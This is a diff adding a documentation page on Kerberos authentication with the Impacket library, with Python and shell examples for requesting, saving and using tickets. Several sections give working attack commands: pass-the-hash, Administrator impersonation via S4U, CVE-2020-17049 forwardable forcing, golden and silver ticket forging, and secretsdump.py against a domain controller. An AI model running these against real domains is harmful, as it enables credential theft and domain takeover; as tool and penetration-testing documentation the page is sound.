@@ -1,0 +1,579 @@
+---
+title: Kerberos Authentication
+description: Working with Kerberos tickets, TGT/TGS requests, and delegation in Impacket
+---
+
+Kerberos is the default authentication protocol for Active Directory environments. Unlike NTLM, Kerberos uses tickets instead of password hashes for authentication, providing better security and enabling features like delegation.
+
+## Kerberos Basics
+
+Kerberos authentication involves three main components:
+
+- **KDC (Key Distribution Center)**: Domain Controller that issues tickets
+- **TGT (Ticket Granting Ticket)**: Initial ticket obtained after authentication
+- **Service Ticket (TGS)**: Ticket for accessing specific services
+
+### Authentication Flow
+
+<Steps>
+  <Step title="Request TGT">
+    Client sends AS-REQ (Authentication Service Request) to the KDC with user credentials
+  </Step>
+  <Step title="Receive TGT">
+    KDC validates credentials and returns TGT in AS-REP (Authentication Service Reply)
+  </Step>
+  <Step title="Request Service Ticket">
+    Client sends TGS-REQ (Ticket Granting Service Request) with TGT to access a service
+  </Step>
+  <Step title="Receive Service Ticket">
+    KDC returns service ticket in TGS-REP
+  </Step>
+  <Step title="Access Service">
+    Client presents service ticket to target service via AP-REQ
+  </Step>
+</Steps>
+
+## Requesting a TGT
+
+### With Password
+
+```python
+from impacket.krb5.kerberosv5 import getKerberosTGT
+from impacket.krb5.types import Principal
+from impacket.krb5 import constants
+
+# Create principal
+userName = Principal('john.doe', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+# Request TGT
+tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
+    clientName=userName,
+    password='P@ssw0rd!',
+    domain='CONTOSO.COM',
+    lmhash=b'',
+    nthash=b'',
+    kdcHost='dc01.contoso.com'
+)
+
+print("[+] TGT obtained successfully")
+print(f"Cipher: {cipher.enctype}")
+print(f"Session Key: {sessionKey.contents.hex()}")
+```
+
+### With NT Hash (Pass-the-Hash)
+
+```python
+from binascii import unhexlify
+
+userName = Principal('administrator', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+# Use NT hash instead of password
+nthash = unhexlify('8846f7eaee8fb117ad06bdd830b7586c')
+
+tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
+    clientName=userName,
+    password='',
+    domain='CONTOSO.COM',
+    lmhash=b'',
+    nthash=nthash,
+    kdcHost='dc01.contoso.com'
+)
+
+print("[+] TGT obtained with NT hash (Pass-the-Hash)")
+```
+
+### With AES Key (Pass-the-Key)
+
+```python
+from binascii import unhexlify
+
+# AES256 key (32 bytes / 64 hex characters)
+aesKey = unhexlify('c4e0e5b1d7c8f5e3a8b2d9f6c4e1a8b5c2d9e6f3a8b5c2d9e6f3a8b5c2d9e6f3')
+
+# Or AES128 key (16 bytes / 32 hex characters)
+# aesKey = unhexlify('c4e0e5b1d7c8f5e3a8b2d9f6c4e1a8b5')
+
+tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
+    clientName=userName,
+    password='',
+    domain='CONTOSO.COM',
+    lmhash=b'',
+    nthash=b'',
+    aesKey=aesKey,
+    kdcHost='dc01.contoso.com'
+)
+
+print("[+] TGT obtained with AES key (Pass-the-Key)")
+```
+
+## Saving and Loading Tickets
+
+### Save TGT to ccache File
+
+```python
+from impacket.krb5.ccache import CCache
+
+# Create ccache object
+ccache = CCache()
+
+# Save TGT
+ccache.fromTGT(tgt, oldSessionKey, sessionKey)
+ccache.saveFile('administrator.ccache')
+
+print("[+] TGT saved to administrator.ccache")
+```
+
+### Load TGT from ccache File
+
+```python
+from impacket.krb5.ccache import CCache
+
+# Load ccache file
+ccache = CCache.loadFile('administrator.ccache')
+
+# Get TGT
+for cred in ccache.credentials:
+    print(f"Principal: {cred['client'].prettyPrint()}")
+    print(f"Server: {cred['server'].prettyPrint()}")
+
+# Extract TGT for use
+principal = ccache.principal.prettyPrint()
+creds = ccache.getCredential(principal.decode())
+tgtData = creds.toTGT()
+
+tgt = tgtData['KDC_REP']
+cipher = tgtData['cipher']
+sessionKey = tgtData['sessionKey']
+```
+
+### Use Tickets with Scripts
+
+```bash
+# Set environment variable to ccache file
+export KRB5CCNAME=/tmp/administrator.ccache
+
+# Use with Impacket tools
+python getTGT.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CONTOSO.COM/administrator
+python psexec.py -k -no-pass CONTOSO.COM/administrator@dc01.contoso.com
+python secretsdump.py -k -no-pass CONTOSO.COM/administrator@dc01.contoso.com
+```
+
+## Requesting Service Tickets
+
+### Request TGS for Specific Service
+
+```python
+from impacket.krb5.kerberosv5 import getKerberosTGS
+from impacket.krb5.types import Principal
+from impacket.krb5 import constants
+
+# Define service principal
+serverName = Principal(
+    'cifs/fileserver.contoso.com',
+    type=constants.PrincipalNameType.NT_SRV_INST.value
+)
+
+# Request service ticket using TGT
+tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
+    serverName=serverName,
+    domain='CONTOSO.COM',
+    kdcHost='dc01.contoso.com',
+    tgt=tgt,
+    cipher=cipher,
+    sessionKey=sessionKey
+)
+
+print("[+] Service ticket obtained")
+print(f"Service: cifs/fileserver.contoso.com")
+```
+
+### Using getTGT.py Script
+
+```bash
+# Request TGT with password
+python getTGT.py CONTOSO.COM/john.doe:P@ssw0rd!
+
+# Request TGT with NT hash
+python getTGT.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CONTOSO.COM/administrator
+
+# Request TGT with AES key
+python getTGT.py -aesKey c4e0e5b1d7c8f5e3a8b2d9f6c4e1a8b5c2d9e6f3a8b5c2d9e6f3a8b5c2d9e6f3 CONTOSO.COM/user
+
+# Specify DC IP
+python getTGT.py -dc-ip 192.168.1.10 CONTOSO.COM/user
+
+# Output saved to: john.doe.ccache
+```
+
+### Using getST.py Script
+
+```bash
+# Request service ticket with credentials
+python getST.py -spn cifs/fileserver.contoso.com -hashes :8846f7eaee8fb117ad06bdd830b7586c CONTOSO.COM/administrator
+
+# Request service ticket using cached TGT
+export KRB5CCNAME=administrator.ccache
+python getST.py -k -no-pass -spn cifs/fileserver.contoso.com CONTOSO.COM/administrator
+
+# Request multiple SPNs
+python getST.py -spn http/webserver.contoso.com -spn cifs/fileserver.contoso.com CONTOSO.COM/user:password
+```
+
+## Kerberos Delegation
+
+### S4U2Self: Impersonation
+
+Request a service ticket on behalf of another user:
+
+```bash
+# Service account requests ticket for Administrator
+python getST.py -spn cifs/fileserver.contoso.com -impersonate Administrator CONTOSO.COM/svcaccount:password
+
+# With hash
+python getST.py -spn cifs/fileserver.contoso.com -impersonate Administrator -hashes :hash CONTOSO.COM/svcaccount
+```
+
+### S4U2Proxy: Constrained Delegation
+
+Request ticket for a different service:
+
+```python
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5.types import Principal
+from impacket.krb5 import constants
+
+# Get TGT for service account
+userName = Principal('svcaccount', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
+    clientName=userName,
+    password='ServiceP@ss',
+    domain='CONTOSO.COM',
+    kdcHost='dc01.contoso.com'
+)
+
+# Use getST.py for S4U2Self + S4U2Proxy
+# See example script for full implementation
+```
+
+### Full S4U Example with getST.py
+
+```bash
+# S4U2Self only (get ticket for impersonated user)
+python getST.py -self -impersonate Administrator -hashes :hash CONTOSO.COM/svcaccount
+
+# S4U2Self + S4U2Proxy (get ticket for target service)
+python getST.py -spn cifs/fileserver.contoso.com -impersonate Administrator -hashes :hash CONTOSO.COM/svcaccount
+
+# With additional ticket (RBCD scenario)
+python getST.py -spn cifs/fileserver.contoso.com -impersonate Administrator -additional-ticket admin.ccache CONTOSO.COM/svcaccount
+
+# Force forwardable flag (CVE-2020-17049)
+python getST.py -spn cifs/fileserver.contoso.com -impersonate Administrator -force-forwardable -hashes :hash -aesKey key CONTOSO.COM/svcaccount
+```
+
+<Warning>
+Constrained delegation requires the service account to have the appropriate delegation rights configured in Active Directory. The target SPN must be in the account's "msDS-AllowedToDelegateTo" attribute.
+</Warning>
+
+## Ticket Manipulation
+
+### Alter Service Name (SPN)
+
+Change the target service in a ticket:
+
+```bash
+# Get ticket for one service, use it for another
+python getST.py -spn cifs/fileserver.contoso.com -impersonate Administrator CONTOSO.COM/svcaccount:password
+
+# Change SPN to different service
+python getST.py -spn cifs/fileserver.contoso.com -altservice http/fileserver.contoso.com -impersonate Administrator CONTOSO.COM/svcaccount:password
+
+# Ticket saved with new SPN
+```
+
+### Golden Ticket Creation
+
+```bash
+# Create golden ticket with ticketer.py
+python ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain CONTOSO.COM administrator
+
+# Creates: administrator.ccache (valid for 10 years by default)
+```
+
+### Silver Ticket Creation
+
+```bash
+# Create silver ticket for specific service
+python ticketer.py -nthash <service_account_hash> -domain-sid S-1-5-21-... -domain CONTOSO.COM -spn cifs/fileserver.contoso.com administrator
+```
+
+## Working with ccache Files
+
+### Inspect Ticket Contents
+
+```bash
+# Use describeTicket.py
+python describeTicket.py administrator.ccache
+
+# Output shows:
+# - Principal name
+# - Encryption type
+# - Ticket flags
+# - Valid times
+# - Renewable until
+```
+
+### Convert Ticket Formats
+
+```bash
+# Convert between ccache and kirbi (Mimikatz format)
+python ticketConverter.py administrator.ccache administrator.kirbi
+python ticketConverter.py administrator.kirbi administrator.ccache
+```
+
+### Programmatic Ticket Inspection
+
+```python
+from impacket.krb5.ccache import CCache
+from datetime import datetime
+
+ccache = CCache.loadFile('administrator.ccache')
+
+for cred in ccache.credentials:
+    print("="*60)
+    print(f"Client: {cred['client'].prettyPrint()}")
+    print(f"Server: {cred['server'].prettyPrint()}")
+    
+    # Times
+    authtime = datetime.fromtimestamp(cred['time']['authtime'])
+    starttime = datetime.fromtimestamp(cred['time']['starttime'])
+    endtime = datetime.fromtimestamp(cred['time']['endtime'])
+    
+    print(f"Auth Time: {authtime}")
+    print(f"Start Time: {starttime}")
+    print(f"End Time: {endtime}")
+    
+    # Encryption
+    print(f"Encryption: {cred['key']['keytype']}")
+    print(f"Key: {cred['key']['keyvalue'].hex()}")
+```
+
+## Kerberos Authentication Modes
+
+### Authentication with Password
+
+```python
+from impacket.smbconnection import SMBConnection
+
+smbClient = SMBConnection('dc01.contoso.com', '192.168.1.10')
+smbClient.kerberosLogin(
+    user='john.doe',
+    password='P@ssw0rd!',
+    domain='CONTOSO.COM',
+    lmhash='',
+    nthash='',
+    aesKey='',
+    kdcHost='dc01.contoso.com'
+)
+```
+
+### Authentication with ccache
+
+```python
+import os
+from impacket.smbconnection import SMBConnection
+
+# Set ccache file
+os.environ['KRB5CCNAME'] = '/tmp/administrator.ccache'
+
+# Authenticate with Kerberos (no password needed)
+smbClient = SMBConnection('dc01.contoso.com', '192.168.1.10')
+smbClient.kerberosLogin(
+    user='administrator',
+    password='',
+    domain='CONTOSO.COM',
+    lmhash='',
+    nthash='',
+    aesKey='',
+    kdcHost='dc01.contoso.com'
+)
+```
+
+## Encryption Types
+
+Kerberos supports multiple encryption algorithms:
+
+```python
+from impacket.krb5 import constants
+
+# Common encryption types
+encryption_types = {
+    constants.EncryptionTypes.rc4_hmac.value: "RC4-HMAC (AKA ArcFour-HMAC-MD5)",
+    constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value: "AES128-CTS-HMAC-SHA1-96",
+    constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value: "AES256-CTS-HMAC-SHA1-96",
+}
+
+for etype, name in encryption_types.items():
+    print(f"{etype}: {name}")
+```
+
+<Info>
+**Encryption Type Notes:**
+- **RC4-HMAC**: Uses NT hash directly, compatible with older systems
+- **AES128/AES256**: More secure, requires AES keys
+- Modern Windows systems prefer AES256
+- RC4 is being deprecated but still widely supported
+</Info>
+
+## Common Kerberos Errors
+
+### KDC_ERR_PREAUTH_FAILED
+
+Invalid credentials:
+
+```python
+# Ensure correct password/hash
+# Verify user account is not locked
+# Check domain name is correct and uppercase
+```
+
+### KDC_ERR_C_PRINCIPAL_UNKNOWN
+
+User doesn't exist:
+
+```python
+# Verify username spelling
+# Ensure user exists in domain
+# Check if account is disabled
+```
+
+### KDC_ERR_S_PRINCIPAL_UNKNOWN
+
+Service doesn't exist:
+
+```python
+# Verify SPN is registered
+# Check service account configuration
+# Use correct SPN format: service/host.domain.com
+```
+
+## Practical Examples
+
+### Example 1: Complete Authentication Flow
+
+```python
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5.types import Principal
+from impacket.krb5.ccache import CCache
+from impacket.krb5 import constants
+from binascii import unhexlify
+
+def authenticate_kerberos(username, nthash, domain, dc_ip, service_spn):
+    """
+    Complete Kerberos authentication flow
+    """
+    # Step 1: Get TGT
+    print("[*] Requesting TGT...")
+    userName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+    
+    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
+        clientName=userName,
+        password='',
+        domain=domain,
+        lmhash=b'',
+        nthash=unhexlify(nthash),
+        kdcHost=dc_ip
+    )
+    print("[+] TGT obtained")
+    
+    # Step 2: Save TGT
+    ccache = CCache()
+    ccache.fromTGT(tgt, oldSessionKey, sessionKey)
+    ccache.saveFile(f'{username}.ccache')
+    print(f"[+] TGT saved to {username}.ccache")
+    
+    # Step 3: Get service ticket
+    print(f"[*] Requesting service ticket for {service_spn}...")
+    serverName = Principal(service_spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+    
+    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
+        serverName=serverName,
+        domain=domain,
+        kdcHost=dc_ip,
+        tgt=tgt,
+        cipher=cipher,
+        sessionKey=sessionKey
+    )
+    print("[+] Service ticket obtained")
+    
+    # Step 4: Save service ticket
+    ccache_service = CCache()
+    ccache_service.fromTGS(tgs, oldSessionKey, sessionKey)
+    ccache_service.saveFile(f'{username}_{service_spn.replace("/", "_")}.ccache')
+    print(f"[+] Service ticket saved")
+    
+    return tgs, sessionKey
+
+# Usage
+tgs, sessionKey = authenticate_kerberos(
+    username='administrator',
+    nthash='8846f7eaee8fb117ad06bdd830b7586c',
+    domain='CONTOSO.COM',
+    dc_ip='192.168.1.10',
+    service_spn='cifs/fileserver.contoso.com'
+)
+```
+
+### Example 2: Ticket Renewal
+
+```python
+from impacket.krb5.ccache import CCache
+from impacket.krb5.kerberosv5 import getKerberosTGS
+from datetime import datetime
+
+def renew_ticket(ccache_file):
+    """
+    Renew an existing TGT
+    """
+    # Load existing ticket
+    ccache = CCache.loadFile(ccache_file)
+    principal = ccache.principal.prettyPrint().decode()
+    creds = ccache.getCredential(principal)
+    
+    # Check if renewable
+    renew_till = datetime.fromtimestamp(creds['time']['renew_till'])
+    if datetime.now() > renew_till:
+        print("[-] Ticket is past renewable time")
+        return False
+    
+    # Renew (requires special flag in original request)
+    print("[*] Renewing ticket...")
+    # Implementation requires TGS-REQ with RENEW flag
+    # See getST.py -renew option
+    
+    return True
+```
+
+## Security Considerations
+
+<Warning>
+**Kerberos Security Best Practices:**
+
+1. **Protect TGTs**: Ticket Granting Tickets provide access to all services - guard them carefully
+2. **Use AES Encryption**: Prefer AES256 over RC4 when possible
+3. **Enable PAC Validation**: Helps prevent Golden Ticket attacks
+4. **Monitor Delegation**: Audit constrained delegation configurations
+5. **Rotate Keys**: Regularly change the krbtgt account password
+6. **Time Synchronization**: Kerberos requires synchronized clocks (within 5 minutes by default)
+</Warning>
+
+## See Also
+
+<CardGroup cols={2}>
+  <Card title="Pass-the-Ticket" icon="ticket" href="/authentication/pass-the-hash">
+    Reuse Kerberos tickets for authentication
+  </Card>
+  <Card title="NTLM Auth" icon="key" href="/authentication/ntlm">
+    Alternative authentication with NTLM
+  </Card>
+</CardGroup>
